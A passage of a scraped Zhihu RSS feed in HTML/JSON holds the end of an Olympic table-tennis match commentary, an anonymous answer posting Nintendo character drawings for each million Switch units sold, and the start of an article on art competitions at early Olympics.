src=\"https://pic1.zhimg.com/v2-fed11cb3ea4723a3a5ace3d3a0db6472_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1117\" data-size=\"normal\" data-caption=\"图源：咪咕直播截图\" data-watermark=\"watermark\" data-original-src=\"v2-fed11cb3ea4723a3a5ace3d3a0db6472\" data-watermark-src=\"v2-ecb2460cc3694270fdc17a0915001329\" data-private-watermark-src=\"v2-85042454dd61639f45899ce9d1e54054\"></p>\n<p>第三局，王曼昱以雷霆之势登场，一度大比分领先。但随着几个接发的问题以及平野的运气球，气势有所回落，教练及时叫了暂停。暂停结束，王曼昱反手起板质量很高，落点在中路偏正手，非常完美。平野的移动速度似乎体现不出什么优势了。平野开始搏杀，但失误率很高，基本没有得分。最终王曼昱轻松获胜，11比3战胜平野！</p>\n<p>王曼昱在整场比赛中体现了极坚韧的意志，再加上护台优势，很多极被动的球都能扭转得分。到了第三局，平野已经没有什么办法了，只好搏杀，但又没有状态。相信以王曼昱的能力，加上奥运等大赛的磨炼，下个周期一定也会是国乒的中流砥柱。</p>\n<hr>\n<p>还没看够？不妨来看看孙颖莎与伊藤的第一次奥运对决：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p><br></p>\n<hr>\n<p>奥运赛程众多，多数以文字简评方式进行赏析。笔者创建了一个专栏，目前收录了较为齐全的各场次简评，自忖在全网算做得最有诚意的之一了。见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic3.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>欢迎前去专栏对我付出精力更大的图文作品进行指正。无团队，无盈利，用爱发电。如果喜欢，欢迎关注（含多个编辑推荐等）：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic1.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">507 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475772055?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/475485375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运乒乓球女单 1/4 决赛石川佳纯 1:4 不敌对手出局，如何评价本场比赛？</a><br>\n","link":"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"SWITCH销量会破亿吗？","date":"2021-08-05 11:30:08","description":"\n<p>不可能破亿的。</p>\n<p><br></p>\n<p>能过5000万就了不起了。</p>\n<p><br></p>\n<p>我觉得是过不了5000万这条线的，要是过了的话，每过100万我在这个回答里更新一个任天堂游戏人物的画像。</p>\n<hr>\n<p>愿赌服输。</p>\n<p><br></p>\n<p>5100万突破的马里奥</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e97c47a40b703e0f1619b32dfcd7a49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-7e97c47a40b703e0f1619b32dfcd7a49\" data-watermark-src=\"v2-5b759cb4c8462090ad284ec0dba96d8b\" data-private-watermark-src=\"v2-6ef7711f8a8da088164c62db56a4c2c0\"></p>\n<p>5200万突破的碧琪公主</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b4941391c25fa167c5f5269be2c3ad45_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-b4941391c25fa167c5f5269be2c3ad45\" data-watermark-src=\"v2-2443f779a45575d6ac0e0fa42ed4a63c\" data-private-watermark-src=\"v2-ee3ae8ac2527c26bb6466b79b892e4e6\"></p>\n<p>财报更新了，目前5577万。</p>\n<p>5300万突破的罗伊·阿夸·库巴</p>\n<p><img src=\"https://pic2.zhimg.com/v2-02cfe45c2d6a5ff805df3180039a6799_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-02cfe45c2d6a5ff805df3180039a6799\" data-watermark-src=\"v2-0cf443a06cedc28ef5e55e9bb3f1218b\" data-private-watermark-src=\"v2-5dee1b4238d232686bdb3e675f8b7b2a\" data-tags=\"politic\"></p>\n<p>5400万突破的初代林克</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1f9c595e2bc4f4e8ec212dbfc1847c31_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-1f9c595e2bc4f4e8ec212dbfc1847c31\" data-watermark-src=\"v2-17cb54ac8696d41ebfe4aed29ee6fe9b\" data-private-watermark-src=\"v2-2dc9b3cb474f37f192c3e56ebc690316\"></p>\n<p>5500万突破的小麦克</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e4a14e1f8a7019850a2e6074fcceefb9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-e4a14e1f8a7019850a2e6074fcceefb9\" data-watermark-src=\"v2-93d3c9cdbd6be2e7f438db7cd9b5a9d2\" data-private-watermark-src=\"v2-0d12380b8963c5ad3de55277cd57eb8b\"></p>\n<p> 任天堂新财报出炉，硬件销量累计6144万台。</p>\n<p>5600万突破的《打鸭子》里的狗。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-34800cf72d395278192a449fdab15fb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-34800cf72d395278192a449fdab15fb4\" data-watermark-src=\"v2-7d1c6cc6d39d2c640437781627e23906\" data-private-watermark-src=\"v2-350f7ba3a744abf92073941d56990587\"></p>\n<p>5700万突破的大库巴。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3480d71eab7a33d784c3ae5c7ccf73c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3480d71eab7a33d784c3ae5c7ccf73c2\" data-watermark-src=\"v2-43671d455892d4f7c17649c8f35c3ef6\" data-private-watermark-src=\"v2-fc50e92beba929d596921cbc51184ba3\"></p>\n<p>5800万突破的初代塞尔达公主。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b699e71ff18611272d87c9dab241f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-b699e71ff18611272d87c9dab241f365\" data-watermark-src=\"v2-5b4694e35ff429dab96642d2933fba0d\" data-private-watermark-src=\"v2-05ff01512c1c3b5fa32a4c48d6c27d19\"></p>\n<p>5900万突破的……“公主在另一个城堡”</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ac4d4dff3b84870f453a689bbcd12f2f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4d4dff3b84870f453a689bbcd12f2f\" data-watermark-src=\"v2-2a084da290cd5f0d9576cbe3877ab809\" data-private-watermark-src=\"v2-c7fffa18dc06036fbabd43e6e1339f15\" data-tags=\"politic\"></p>\n<p>6000万突破的DONKEY KONG X 凑阿夸</p>\n<p><img src=\"https://pic3.zhimg.com/v2-75d04349ee9d4784f55eadb4ab8eafca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-75d04349ee9d4784f55eadb4ab8eafca\" data-watermark-src=\"v2-47f2a86f52169155ba5bb33081fbfb44\" data-private-watermark-src=\"v2-189e7b375401321be63bc50717a90aec\"></p>\n<p>6100万突破的《MOTHER》初代主角：NINTEN</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f566941b5a0bacd5c09a8b69a1b4ca89_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f566941b5a0bacd5c09a8b69a1b4ca89\" data-watermark-src=\"v2-0f343fb74aa79ef9222140944ede4f86\" data-private-watermark-src=\"v2-ab8892c93527abbfe8c7161e69bea803\"></p>\n<p>任天堂新财报出炉，硬件销量累计6830万台。</p>\n<p>因为这次有人提醒所以提前几天就画了……到家后传上来吧。</p>\n<p>这次我猜得挺准的……</p>\n<p>6200万突破的卡比（卡比的造型是真好画啊……）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4803c93cc89ab7038c0e50efcabcf284_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4803c93cc89ab7038c0e50efcabcf284\" data-watermark-src=\"v2-05307b92cfd5cd1ec15163ac2fd10706\" data-private-watermark-src=\"v2-77bec68f4d48ddeb9e64d6b9889ee2ef\"></p>\n<p>6300万突破的马里奥系列经典家门怪酷栗宝。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3016f768a9d2caa844ad73888afb9bba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3016f768a9d2caa844ad73888afb9bba\" data-watermark-src=\"v2-4aaf71c3a15df5f274d1609204799d0e\" data-private-watermark-src=\"v2-aff026e2ef5922fc1b5dc340bb9eedcb\"></p>\n<p>6400万突破的塞尔达传说系列人气角色……汀格尔（不过气球装的来源是DS上的汀格尔气球大战）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f44b617999b0a5fd1955a4970bba2d4c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f44b617999b0a5fd1955a4970bba2d4c\" data-watermark-src=\"v2-9a88e892a4097e9b1b0ae448df9e88ea\" data-private-watermark-src=\"v2-f639da87b33cf41809fbf8148251ca7d\"></p>\n<p>6500万突破的火焰之纹章初代男主马尔斯。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4fc800703398b2206fc5b0f0b6832665_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4fc800703398b2206fc5b0f0b6832665\" data-watermark-src=\"v2-44fecc7621f294be30e695c0c455631b\" data-private-watermark-src=\"v2-9ee0629b4f51859c72a4007b95ab209f\"></p>\n<p>6600万突破的塞尔达传说风之杖的BOSS加农。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-eb9869674e2a8829c733e496254c98b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-eb9869674e2a8829c733e496254c98b0\" data-watermark-src=\"v2-f0a86545a27a07766da8008c3c48672f\" data-private-watermark-src=\"v2-e668ab9e0e768590bf17ecf7eff1b04b\"></p>\n<p>6700万突破的银河战士系列主角萨姆斯。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-81e3fe5406082c4c3eeb50a962907a8f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-81e3fe5406082c4c3eeb50a962907a8f\" data-watermark-src=\"v2-55eec70f197b516504dca4c76d2a9658\" data-private-watermark-src=\"v2-3e2f1cc0417f0ead4bfc87a202140399\"></p>\n<p>6800万突破的马里奥系列老二哥路易。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c867c6fd6d65b4cbfe181a31cf1d2e68_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-c867c6fd6d65b4cbfe181a31cf1d2e68\" data-watermark-src=\"v2-cb561b7ec9113cbbcecc0f9b22a08f62\" data-private-watermark-src=\"v2-c9a298d2a93c72d3c6f135c4051d26f6\"></p>\n<p>任天堂新财报出炉，硬件销量累计7987万台。</p>\n<p>虽然提前画了些但少估了200万，到家后快点画完补上两张……</p>\n<p>6900万突破的马里奥系列经典怪德哥（其实叫锤子兄弟……）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8b2f990ffec63361f15bd33026411289_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8b2f990ffec63361f15bd33026411289\" data-watermark-src=\"v2-e52ac808c5436d3e2f3de80d209f0b64\" data-private-watermark-src=\"v2-65bbca677355c656e282506641a2a306\"></p>\n<p>7000万突破的老娘经典怪星人</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d1c6548698743b1ef4c4287603c64cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-0d1c6548698743b1ef4c4287603c64cd\" data-watermark-src=\"v2-cd1a2522295b09ea4464f0e3300577cb\" data-private-watermark-src=\"v2-ad4dbba6397b9f6335b3a183fd8fb99e\"></p>\n<p>7100万突破的纸马折纸王国的炸弹彬</p>\n<p><img src=\"https://pic4.zhimg.com/v2-226f2adb536326398924c042bbb75602_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-226f2adb536326398924c042bbb75602\" data-watermark-src=\"v2-b391eeeab09d63f2b6f4e06e0a34e4f0\" data-private-watermark-src=\"v2-4a5afc5a0f16cfea629c8010b4d2ec9c\"></p>\n<p>7200万突破的F-ZERO猎鹰队长</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac4847300494463862f509f3cbf9c5d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4847300494463862f509f3cbf9c5d2\" data-watermark-src=\"v2-adbd433b35e540fb347ba458cb07c75b\" data-private-watermark-src=\"v2-2814d104d864e374c1980d59d9f5b5c9\"></p>\n<p>7300万突破的口袋妖怪经典PM鲤鱼王</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1e278a6a9f60a043bbbb7857a927edf3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-1e278a6a9f60a043bbbb7857a927edf3\" data-watermark-src=\"v2-11f2f41b0bb6487694ac3475f889fa7d\" data-private-watermark-src=\"v2-2504c7a60907cfb9a886c05a7288404f\"></p>\n<p>7400万突破的魔法假日女主角</p>\n<p><img src=\"https://pic2.zhimg.com/v2-575443f7856df5a41c3126730b52102a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-575443f7856df5a41c3126730b52102a\" data-watermark-src=\"v2-b351c118ae00d047f9ca4c16084d86eb\" data-private-watermark-src=\"v2-d814264ddea00c0c4b3768e5b7fa97b0\"></p>\n<p>7500万突破的塞尔达时之笛傲娇佐拉小公主露塔</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d7f34f8247ff89807684c4a587bc6eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-d7f34f8247ff89807684c4a587bc6eb4\" data-watermark-src=\"v2-45c1ebafe29ac4a705d870b80416d8a2\" data-private-watermark-src=\"v2-9eccac143414d4a8978d64b1ec8072cd\"></p>\n<p>7600万突破的口袋妖怪PM 巨钳螳螂</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fb76ae1344f27a277a0dc219d1c0e323_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-fb76ae1344f27a277a0dc219d1c0e323\" data-watermark-src=\"v2-e88360ee0d8a0fea1e9700e2182d02d6\" data-private-watermark-src=\"v2-8a380a6430863c1ffee7c6134ca33836\"></p>\n<p>7700万突破的动物之森恶毒资本家狸克</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3a0becf83c4f72e574f361e50e78b34d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3a0becf83c4f72e574f361e50e78b34d\" data-watermark-src=\"v2-edf5e367e272d180696c5ba4ab650bf3\" data-private-watermark-src=\"v2-78ace80e99951ca815f1d7e9be2b3a9f\"></p>\n<p>7800万突破的皮克敏主角奥利马</p>\n<p><img src=\"https://pic3.zhimg.com/v2-71e28f8a0385653c4bd5fe662b7a2930_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-71e28f8a0385653c4bd5fe662b7a2930\" data-watermark-src=\"v2-5c39930229a2fb2f84ab0fb6dc42d29f\" data-private-watermark-src=\"v2-0b4139cb2baa1a72f4b89535bcba2237\"></p>\n<p>7900万突破的黄金太阳米雅莉</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4127f601aab0aa6a957275417cb2484a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4127f601aab0aa6a957275417cb2484a\" data-watermark-src=\"v2-4ae487bb7391aea965d9fe40e010dd06\" data-private-watermark-src=\"v2-dc881b0ee2444af0c2fa03a2d344868d\"></p>\n<p>……躺着也赚爆，ND还会开吗。</p>\n<p> 任天堂财报出炉，截止2021年3月31日：NS硬件销量累计8459万台。</p>\n<p>最近痛风（不是MHR）中只能保持着一个难受的姿势画图，没什么耐心就偷了一些工……</p>\n<p>8000万突破的马里奥系列的黛西公主。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b1107350eb990c83225ee4f616e0202_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-2b1107350eb990c83225ee4f616e0202\" data-watermark-src=\"v2-a0486a36b1dccaf4efc199ec31f65d1e\" data-private-watermark-src=\"v2-90bcb7669e244cbaa419957b98de4186\"></p>\n<p>8100万突破的健身环BOSS堕拉贡，顺便庆贺健身环突破1000万销量。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc89fc783f84f45405a049b65593e926_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1100\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-dc89fc783f84f45405a049b65593e926\" data-watermark-src=\"v2-4a6d9eba1d4fdd222091e0d684483737\" data-private-watermark-src=\"v2-d03dbb1f838f5d4448284212ffed6c27\"></p>\n<p>8200万突破的口袋妖怪大朝北鼻</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f71f639f10888c3781d5d938aee51718_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f71f639f10888c3781d5d938aee51718\" data-watermark-src=\"v2-6170a25880e687ef62a8ada01da4a324\" data-private-watermark-src=\"v2-37ba9ea174ce13053c19a3c1bbc33922\"></p>\n<p>8300万突破的迪迪刚</p>\n<p><img src=\"https://pic1.zhimg.com/v2-48a68a8f1a13c99de91f55b962c6616b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-48a68a8f1a13c99de91f55b962c6616b\" data-watermark-src=\"v2-eb1e481256fcfb6ff74d1c139b30783d\" data-private-watermark-src=\"v2-946769d6fbfc45f44a13872cb77d3687\"></p>\n<p>8400万突破的火纹初代女主希达</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f1d6481f538b2d400c7d1d4fbe65980e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f1d6481f538b2d400c7d1d4fbe65980e\" data-watermark-src=\"v2-8a542c9eb9fd526432313aa4313599a8\" data-private-watermark-src=\"v2-35da410d847903c36d70c7c03bdac238\"></p>\n<p>该忏悔了……</p>\n<p>任天堂财报出炉，截止2021年6月30日：NS硬件销量累计8904万台。</p>\n<p>这次有之前多画的凑数，倒是省事……</p>\n<p>8500万突破的零装萨姐</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5f2b2f55f11a627558080182c5ef7eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-5f2b2f55f11a627558080182c5ef7eb4\" data-watermark-src=\"v2-9ce5618b77239810a63041682f53d18b\" data-private-watermark-src=\"v2-bc6166d27a756bb07139b9865dfd83d5\"></p>\n<p>8600万突破的马里奥系列炮弹刺客</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8e716ed1ecb8ea2439acc0a39ccfdf3b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8e716ed1ecb8ea2439acc0a39ccfdf3b\" data-watermark-src=\"v2-f6745518de669ccc4d63fa490499c0d1\" data-private-watermark-src=\"v2-869e94fce98da02f7b0eb847accf3121\"></p>\n<p>8700万突破的金属之光主角老妹日向梓</p>\n<p><img src=\"https://pic2.zhimg.com/v2-55557db03287da3fdde7cfe83a21ee4d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-55557db03287da3fdde7cfe83a21ee4d\" data-watermark-src=\"v2-f2ba8b2c7b7c006c73c963d9cae0b286\" data-private-watermark-src=\"v2-1c8738f450b05cb665b410f86de18304\"></p>\n<p>8800万突破的赫拉克罗斯</p>\n<p><img src=\"https://pic2.zhimg.com/v2-433f189074bc85d487d260c8b2c3a9de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-433f189074bc85d487d260c8b2c3a9de\" data-watermark-src=\"v2-c21118e69d7de503ef0128763e490da7\" data-private-watermark-src=\"v2-958bbdc57fff20166edfd779cec3417c\"></p>\n<p>8900万突破的面具商人（这个角色真是塞尔达系列里最让我感觉渗人的……某种意义上的童年阴影）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cbf965782065bc781bc2f655b2a95ab7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-cbf965782065bc781bc2f655b2a95ab7\" data-watermark-src=\"v2-0d5a9b7de29293b5e3807e3741a9bbf8\" data-private-watermark-src=\"v2-d83c9587d4b538306efb20b796130bc3\"></p>\n<p>这次硬件销量同比缩水，爆杀古川，该来点大的了吧！（但其实是去年动森太猛了，恐怕古川还要继续躺……）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">匿名用户</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">190 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/297478327?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价switch2019年推出的升级版？</a><br><a href=\"http://www.zhihu.com/question/286061729?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">年龄大了玩 Switch 什么感受？</a><br>\n","link":"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如果艺术家也能角逐奥运金牌……","date":"2021-08-05 09:34:13","description":"\n<p>1908年奥运会，沃尔特·威南斯代表美国队出赛，赢得了射击项目金牌。他在1912年又一次参加奥运会，并且除射击之外，还参加了另一个项目，并赢得金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_b.jpg\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1532\" class=\"origin_image zh-lightbox-thumb\" width=\"2048\" data-original=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_r.jpg\"><figcaption>沃尔特·威南斯</figcaption></figure><p>问：沃尔特·威南斯参加的是什么项目？</p>\n<ul>\n<li>A，马术</li>\n<li>B，游泳</li>\n<li>C，唱歌</li>\n<li>D，雕塑</li>\n</ul>\n<p>要是按照以往做选择题的经验，我们肯定先排除两个明显和题干奥运会无关的选项唱歌和雕塑，然后再考虑，射击、游泳和马术都包含在现代五项里面，不太好选，但看照片这位老人家颇有一幅西部片里面警长的样子，肯定会骑马，不一定会游泳，所以答案应该是A，马术？</p>\n<p>很遗憾，答案是D。他的金牌的确和马有关，但并不是马术，而是……一件青铜雕塑——《美国快步马》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_b.jpg\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_r.jpg\"><figcaption>沃尔特·威南斯，《美国快步马》</figcaption></figure><p>是的，当年的奥运会，曾经是比雕塑的。而且不光有雕塑，还有绘画、建筑、音乐和文学，一比就是几十年。</p>\n<p>在奥运会搞艺术大奖赛这事儿确实不是瞎折腾，而是现代奥林匹克运动会的创始人皮埃尔·德·顾拜旦的主意。早在1894年头一回奥运会之后，顾拜旦就觉得不过瘾，不够劲儿。他觉得世界大同光靠体育的交流还是不够，还需要有心灵的交流，心灵交流就要靠艺术。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"965\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_r.jpg\"><figcaption>顾拜旦男爵皮埃尔·德·弗雷迪</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"767\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" 